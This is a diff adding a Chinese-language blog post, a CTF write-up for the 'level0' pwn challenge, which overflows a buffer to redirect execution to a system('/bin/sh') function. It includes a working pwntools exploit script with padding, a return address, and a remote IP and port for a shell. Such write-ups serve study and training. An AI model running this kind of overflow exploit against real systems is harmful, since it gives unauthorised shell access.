@@ -1,0 +1,58 @@
+---
+layout: post
+title:  level0
+date:   2020-08-18 00:01:01 +0300
+image:  2020-08-18-young.jpg
+tags:   [ctf,pwn,攻防世界]
+---
+
+先运行文件，看到会让我们输入内容，
+
+![]({{site.baseurl}}/img/2020-08-18-run.jpg)
+
+ida64打开文件，查看主函数
+
+```assembly
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  write(1, "Hello, World\n", 0xDuLL);
+  return vulnerable_function();
+}
+```
+
+输入应该是在vulnerable_function()函数中，打开查看代码
+
+```assembly
+ssize_t vulnerable_function()
+{
+  char buf; // [rsp+0h] [rbp-80h]
+
+  return read(0, &buf, 0x200uLL);
+}
+```
+
+变量buf的大小是0x80
+
+然后通过字符串找到了system函数
+
+```assembly
+int callsystem()
+{
+  return system("/bin/sh");
+}
+```
+
+所以只要让栈返回到这个函数即可。
+
+编写exp
+
+```assembly
+from pwn import *
+
+io = remote("220.249.52.133",45728)
+payload = "A" * (0x80 + 8) + p64(0x00400596)
+io.sendline(payload)
+io.interactive()
+```
+
+![]({{site.baseurl}}/img/2020-08-18-result.jpg)
